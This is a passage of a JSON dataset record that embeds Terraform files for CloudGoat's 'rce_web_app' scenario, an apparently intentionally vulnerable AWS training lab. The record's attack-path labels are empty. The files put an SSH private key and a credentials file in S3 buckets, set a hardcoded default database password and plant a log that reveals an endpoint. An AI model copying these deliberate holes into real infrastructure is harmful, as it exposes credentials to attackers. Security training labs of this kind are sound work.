+      "text": "#Logs S3 Bucket\nresource \"aws_s3_bucket\" \"logs\" {\n  bucket        = \"cg-logs-s3-bucket-${local.cgid_suffix}\"\n  force_destroy = true\n  tags = {\n    Description = \"CloudGoat ${var.cgid} S3 Bucket used for ALB Logs\"\n  }\n}\n\n#Logs S3 Bucket Policy\nresource \"aws_s3_bucket_policy\" \"logs_policy\" {\n  bucket = aws_s3_bucket.logs.id\n  policy = jsonencode({\n    Id      = \"Policy1558803362844\"\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Sid      = \"load-balancer-policy\"\n        Action   = \"s3:PutObject\"\n        Effect   = \"Allow\"\n        Resource = \"${aws_s3_bucket.logs.arn}/cg-lb-logs/AWSLogs/${data.aws_caller_identity.this.account_id}/*\"\n        Principal = {\n          AWS = \"arn:aws:iam::127311923021:root\"\n        }\n      }\n    ]\n  })\n}\n\nresource \"aws_s3_object\" \"lb_logs\" {\n  bucket = aws_s3_bucket.logs.id\n  key    = \"cg-lb-logs/AWSLogs/${data.aws_caller_identity.this.account_id}/elasticloadbalancing/${var.region}/2019/06/19/555555555555_elasticloadbalancing_us-east-1_app.cg-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log\"\n  content = templatefile(\"../assets/elasticloadbalancing.log\", {\n    cgid              = \"cg-lb-${local.cgid_suffix}\"\n    load_balancer_dns = aws_lb.this.dns_name\n    target_group_arn  = aws_lb_target_group.this.arn\n  })\n}\n\n\n#Secret S3 Bucket\nresource \"aws_s3_bucket\" \"secret\" {\n  bucket        = \"cg-secret-s3-bucket-${local.cgid_suffix}\"\n  force_destroy = true\n  tags = {\n    Description = \"CloudGoat ${var.cgid} S3 Bucket used for storing a secret\"\n  }\n}\n\nresource \"aws_s3_object\" \"db_credentials\" {\n  bucket = aws_s3_bucket.secret.id\n  key    = \"db.txt\"\n  source = \"../assets/db.txt\"\n}\n\n\n#Keystore S3 Bucket\nresource \"aws_s3_bucket\" \"keystore\" {\n  bucket        = \"cg-keystore-s3-bucket-${local.cgid_suffix}\"\n  force_destroy = true\n  tags = {\n    Description = \"CloudGoat ${var.cgid} S3 Bucket used for storing ssh keys\"\n  }\n}\n\nresource \"aws_s3_object\" \"ssh_private_key\" {\n  bucket = aws_s3_bucket.keystore.id\n  key    = \"cloudgoat\"\n  source = var.ssh_private_key\n}\n\nresource \"aws_s3_object\" \"ssh_public_key\" {\n  bucket = aws_s3_bucket.keystore.id\n  key    = \"cloudgoat.pub\"\n  source = var.ssh_public_key\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/terraform/settings.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/terraform/settings.tf",
+      "member_sha256": "452a2f525dbed6c284069e6e5bebd50447c28b1381ca1ae86c0047b49792b8b0",
+      "bytes": 325,
+      "content_kind": "tf",
+      "text": "terraform {\n  required_version = \">= 1.5\"\n\n  required_providers {\n    aws = {\n      source  = \"hashicorp/aws\"\n      version = \">= 5.0.0\"\n    }\n  }\n}\n\n\nprovider \"aws\" {\n  profile = var.profile\n  region  = var.region\n\n  default_tags {\n    tags = {\n      Stack    = var.stack-name\n      Scenario = var.scenario-name\n    }\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/terraform/variables.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/terraform/variables.tf",
+      "member_sha256": "38420c37cd9ad170d85b52807b95a73d042673e68f335c9b92779587ee0bfb4b",
+      "bytes": 1190,
+      "content_kind": "tf",
+      "text": "variable \"profile\" {\n  description = \"The AWS profile to use.\"\n  type        = string\n}\n\nvariable \"region\" {\n  description = \"The AWS region to deploy resources to.\"\n  default     = \"us-east-1\"\n  type        = string\n}\n\nvariable \"cgid\" {\n  description = \"CGID variable for unique naming.\"\n  type        = string\n}\n\nvariable \"cg_whitelist\" {\n  description = \"User's public IP address\"\n  type        = list(string)\n}\n\nvariable \"rds_username\" {\n  description = \"RDS PostgreSQL instance username\"\n  default     = \"cgadmin\"\n  type        = string\n}\n\nvariable \"rds_password\" {\n  description = \"RDS PostgreSQL instance password\"\n  default     = \"Purplepwny2029\"\n  type        = string\n}\n\nvariable \"ssh_public_key\" {\n  description = \"Where to store the public key\"\n  default     = \"../cloudgoat.pub\"\n  type        = string\n}\n\nvariable \"ssh_private_key\" {\n  description = \"Where to store the private key\"\n  default     = \"../cloudgoat\"\n  type        = string\n}\n\nvariable \"stack-name\" {\n  description = \"Name of the stack.\"\n  default     = \"CloudGoat\"\n  type        = string\n}\n\nvariable \"scenario-name\" {\n  description = \"Name of the scenario.\"\n  default     = \"rce-web-app\"\n  type        = string\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/terraform/vpc.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/terraform/vpc.tf",
+      "member_sha256": "732eb8184125174705c24e673846487351564f0b879533390fd424f48ce23176",
+      "bytes": 2234,
+      "content_kind": "tf",
+      "text": "#VPC\nresource \"aws_vpc\" \"this\" {\n  cidr_block           = \"10.0.0.0/16\"\n  enable_dns_hostnames = true\n  tags = {\n    Name = \"CloudGoat ${var.cgid}\"\n  }\n}\n\n#Internet Gateway\nresource \"aws_internet_gateway\" \"this\" {\n  vpc_id = aws_vpc.this.id\n  tags = {\n    Name = \"CloudGoat ${var.cgid}\"\n  }\n}\n\n\n#Public Subnets\nresource \"aws_subnet\" \"public_1\" {\n  availability_zone = \"${var.region}a\"\n  cidr_block        = \"10.0.10.0/24\"\n  vpc_id            = aws_vpc.this.id\n  tags = {\n    Name = \"CloudGoat Public Subnet #1\"\n  }\n}\n\nresource \"aws_subnet\" \"public_2\" {\n  availability_zone = \"${var.region}b\"\n  cidr_block        = \"10.0.20.0/24\"\n  vpc_id            = aws_vpc.this.id\n  tags = {\n    Name = \"CloudGoat Public Subnet #2\"\n  }\n}\n\n#Private Subnets\nresource \"aws_subnet\" \"private_1\" {\n  availability_zone = \"${var.region}a\"\n  cidr_block        = \"10.0.30.0/24\"\n  vpc_id            = aws_vpc.this.id\n  tags = {\n    Name = \"CloudGoat Private Subnet #1\"\n  }\n}\n\nresource \"aws_subnet\" \"private_2\" {\n  availability_zone = \"${var.region}b\"\n  cidr_block        = \"10.0.40.0/24\"\n  vpc_id            = aws_vpc.this.id\n  tags = {\n    Name = \"CloudGoat Private Subnet #2\"\n  }\n}\n\n\n#Public Subnet Routing Table\nresource \"aws_route_table\" \"public\" {\n  vpc_id = aws_vpc.this.id\n\n  route {\n    cidr_block = \"0.0.0.0/0\"\n    gateway_id = aws_internet_gateway.this.id\n  }\n\n  tags = {\n    Name = \"CloudGoat Route Table for Public Subnet\"\n  }\n}\n\n#Private Subnet Routing Table\nresource \"aws_route_table\" \"private\" {\n  vpc_id = aws_vpc.this.id\n  tags = {\n    Name = \"CloudGoat Route Table for Private Subnet\"\n  }\n}\n\n\n#Public Subnets Routing Associations\nresource \"aws_route_table_association\" \"public_1\" {\n  subnet_id      = aws_subnet.public_1.id\n  route_table_id = aws_route_table.public.id\n}\n\nresource \"aws_route_table_association\" \"public_2\" {\n  subnet_id      = aws_subnet.public_2.id\n  route_table_id = aws_route_table.public.id\n}\n\n\n#Private Subnets Routing Associations\nresource \"aws_route_table_association\" \"private_1\" {\n  subnet_id      = aws_subnet.private_1.id\n  route_table_id = aws_route_table.private.id\n}\n\nresource \"aws_route_table_association\" \"private_2\" {\n  subnet_id      = aws_subnet.private_2.id\n  route_table_id = aws_route_table.private.id\n}",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    }
+  ],
+  "runtime_instances": [],
+  "source_context_fields": [
+    "candidate_metadata",
+    "runtime_instances",
+    "source",
+    "source_materials"
+  ],
+  "source_context_sha256": "5137fb3b9be671b2a46c607d6dd43e7b157ed85b7eca891fedc086316f89b3ff",
+  "admission_screen": {
+    "external_or_low_privilege_entry_defined": null,
+    "multi_step_path_present": null,
+    "cloud_data_target_present": null,
+    "critical_edges_have_raw_evidence": null,
+    "not_a_near_duplicate": null,
+    "decision": null,
+    "rationale": null
+  },
+  "nodes": [],
+  "edges": [],
+  "path_labels": [],
+  "tool_tasks": [],
+  "instance_labels": []
+}
